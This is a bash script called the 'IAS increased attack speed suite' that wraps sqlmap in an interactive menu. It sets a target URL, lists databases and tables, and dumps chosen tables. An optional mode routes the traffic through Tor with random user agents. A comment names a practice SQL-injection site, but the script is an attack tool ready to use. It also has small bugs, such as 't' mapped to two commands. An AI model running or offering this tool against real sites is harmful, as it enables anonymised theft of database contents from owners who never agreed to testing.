#!/bin/bash

#	target hackit.gehaxelt.in/sqli/level1.php?id=1

####
#
# TODO: dump command, cookies support
#		clear screen stuff
####

URL=""
DOMAIN=""

RED="\E[0;41m\033[1m"
GREEN="\E[30;42m\033[30m"
NC="\033[0m"

function squik()
{

	URL="NONE"
	ANONMSG="OFF"
	ANON=""
	USER=$(whoami)
	DOMAIN="NONE"
	DB=""
	DBMSG=""
	TABLE=""
	TABLEMSG=""

	TMP=""
	DBCNT=""
	TABLECNT=""

	#font colors
	#RED='\033[0;31m' 
	#GREEN='\033[0;32m'

	NC='\033[0m' # No Color
	# font + font bg colors
	RED="\E[0;41m\033[1m"
	GREEN="\E[30;42m\033[30m"
	SET="\E[30;46m\033[30m"

	URLCOLOR=$RED
	ANONCOLOR=$RED
	DOMAINCOLOR=$RED
	DBSCOLOR=$RED
	DBCOLOR=$RED
	TABLESCOLOR=$RED
	TABLECOLOR=$RED

	while true
		do

		echo -e "\033[2J\033[1;1H"
		echo -ne "${DOMAINCOLOR}Domain:\t\t$DOMAIN${NC}\n"
		echo -ne "${URLCOLOR}Target:\t\t$URL${NC}\n"
		echo -ne "${ANONCOLOR}Anonymous:\t$ANONMSG${NC}\n"
		echo -ne "\n${DBSCOLOR}$DBCNT\t${DBARRAY[*]}${NC}\n"
		echo -ne "${TABLESCOLOR}$TABLECNT\t${TABLEARRAY[*]}${NC}\n"
		echo -ne "\n${DBCOLOR}$DBMSG$DB${NC}\n"
		echo -ne "${TABLECOLOR}$TABLEMSG$TABLE${NC}\n"
		echo -ne "\nIAS_squik> " 
		read CMD ARG

		case $CMD in
			"target" | "t")
				if [ -z "$ARG" ]; then
					URL="NONE"
					DOMAIN="NONE"
					URLCOLOR=$RED
					DOMAINCOLOR=$RED
					unset DBARRAY
					unset DBCNT
					unset DB
					unset DBMSG
					unset TABLEARRAY
					unset TABLECNT
					unset TABLE
					unset TABLEMSG
				else
				URL=$ARG
				URLCOLOR=$GREEN
				DOMAIN=$URL
				
				echo "$DOMAIN" | grep -F "http://"
				if [ $? -eq 0 ];then
				echo "http"
					DOMAIN="${URL#http://}"
				fi
				
				echo "$DOMAIN" | grep -F "https://"
				if [ $? -eq 0 ];then
				echo "https"
					DOMAIN="${URL#https://}"
				fi
				
				DOMAIN="$(echo $DOMAIN | grep -oP '^[^\/]*')"
				
				DOMAINCOLOR=$GREEN
				unset DBARRAY
				unset DBCNT
				unset DB
				unset DBMSG
				unset TABLEARRAY
				unset TABLECNT
				unset TABLE
				unset TABLEMSG
				fi
				;;
			"anon" | "a")
				if [ "$ARG" == "on" ]; then
					ANONMSG="ON"
					ANON="--tor --tor-type=SOCKS5 --tor-port 9050 --check-tor --random-agent"
					ANONCOLOR=$GREEN
				elif [ "$ARG" == "off" ]; then
					ANONMSG="OFF"
					ANON=""
					ANONCOLOR=$RED
				fi
				;;
			"run" | "r")
				if [ "$URL" = "NONE" ]; then
					echo -ne "${RED}[!] set target URL first${NC}"
				else 
				
					rm /home/$USER/.sqlmap/output/$DOMAIN/log
				
					sqlmap -o $ANON -u $URL --dbs #attack string
					TMP=$(cat /home/$USER/.sqlmap/output/$DOMAIN/log | grep -oP '(?<=\[\*\] ).*' | sort | uniq)
					DBCNT="DBS [$(echo $TMP | wc -w)]:"
				
					CNT=0
					for i in ${TMP//'\n'/};
					do
						DBARRAY[CNT]=$i;
						((CNT++));
					done
				fi

				if [ "$(echo $TMP | wc -w)" != "0" ]; then
					DBSCOLOR=$GREEN
				fi
		### prompt for DB
				echo -e "\033[2J\033[1;1H"
				CNT=0
				for DBS in ${DBARRAY[*]}
				do
					echo -e "[$CNT]\t$DBS"
					((CNT++))
				done
				echo -en "\nchoose DB: "	
				read INPUT
				
				DBMSG="[!] DB:\t\t"
				DB="${DBARRAY[$INPUT]}"
				DBCOLOR=$SET
				;;
			"tables" | "t")
				if [ -z "$DB" ]; then
					echo -ne "\n${RED}[!] set DB first: db <DB NAME>${NC}\n"
					echo -ne "\n\n<continue>"
					read -n 1 -s
					continue
				else 
					sqlmap -o $ANON -u $URL --tables -D $DB #attack string
					TMP=$(cat /home/$USER/.sqlmap/output/$DOMAIN/log | grep -oP '(?<=\| ).*(?= \|)' | sort | uniq)
					TABLECNT="TABLES [$(echo $TMP | wc -w)]:"

					CNT=0
					for i in ${TMP//'\n'/};
					do
						TABLEARRAY[CNT]=$i;
						((CNT++));
					done
					TABLESCOLOR=$GREEN
				fi	
		### Prompt for TABLE		
				echo -e "\033[2J\033[1;1H"
				CNT=0
				for TABLES in ${TABLEARRAY[*]}
				do
					echo -e "[$CNT]\t$TABLES"
					((CNT++))
				done
				echo -en "\nchoose TABLE: "
				read INPUT
				
				TABLEMSG="[!] TABLE:\t"
				TABLE="${TABLEARRAY[$INPUT]}"
				TABLECOLOR=$SET
				;;
			"dump"| "d")
				if [ -z "$DB" ]; then
					echo -ne "\n${RED}[!] set DB first: db${NC}\n"
					echo -ne "\n\n<continue>"
					read -n 1 -s
					continue
				elif [ -z "$TABLE" ]; then
					echo -ne "\n${RED}[!] set TABLE first: table${NC}\n"
					echo -ne "\n\n<continue>"
					read -n 1 -s
					continue	
				else 
					sqlmap -o $ANON -u $URL --dump -T $TABLE -D $DB

				fi
				echo -ne "\n\n<continue>"
				read -n 1 -s
				continue
				;;
			"exit")
				exit 0
				;;
			"?"|"help")
				echo -e "\nset target URL:  [t]arget <URL>"
				echo "set anonymous:   [a]non <on|off>"
				echo "start scan:      [r]un"
				echo "get tables:      [t]ables"
				echo "dump data:       [d]ump"
				echo "quit squik:      exit"
				echo -ne "\n<continue>"
				read -n 1 -s
				;;
		esac
	done
}

function quap()
{
	echo "quap quap"
}


function init(){
	
	ping -c 2 localhost
	if [ $? != "0" ]; then
		messages "test ping failed. check your network!"
		echo "test ping failed. check your network!"
	else
		messages "network connection OK"
		echo "network connection OK"
	fi
	#check ping 8.8.8.8
	#check namp
	#check sqlmap
	#check TOR
	#check proxychains
	
}

function main()
{
	while true
	do

		echo -e "\033[2J\033[1;1H"
		echo "###########################################################"
		echo "#                                                         #"
		echo "#                           IAS                           #"
		echo "#              increased attack speed suite               #"
		echo "#                                                         #"
		echo "###########################################################"


		if [ -z "$URL" ]; then
			echo -ne "\n\nTarget URL:  "
			read INPUT
			URL="$INPUT"
			
			DOMAIN=$URL
					
			echo "$DOMAIN" | grep -F "http://"
			if [ $? -eq 0 ];then
				echo "http"
				DOMAIN="${URL#http://}"
			fi
					
			echo "$DOMAIN" | grep -F "https://"
			if [ $? -eq 0 ];then
				echo "https"
				DOMAIN="${URL#https://}"
			fi
					
			DOMAIN="$(echo $DOMAIN | grep -oP '^[^\/]*')"
			
			#ping -c 3 -w 1 $DOMAIN
			#check if host is alive todo
			
			continue
		fi
		
		echo -e "\n${GREEN}                                           ${NC}"
		echo -e "DOMAIN: $DOMAIN"
		echo -e "TARGET: $URL"
		echo -e "${GREEN}                                           ${NC}"
		echo ""
		echo -e "[1]  squik (sqlmap quick)"
		echo -e "[2]  quap (quick nmap)"
		echo -e "[3]  exit IAS\n"
		echo -en "IAS> "
		
		read INPUT

		case $INPUT in
			"1")
				squik null
			;;
			"2")
			#	quap
			;;
			"3")
				exit 0
			;;
		esac

	done

}

function messages(){
	
	echo $1
		
}

init // init all
main // start start main
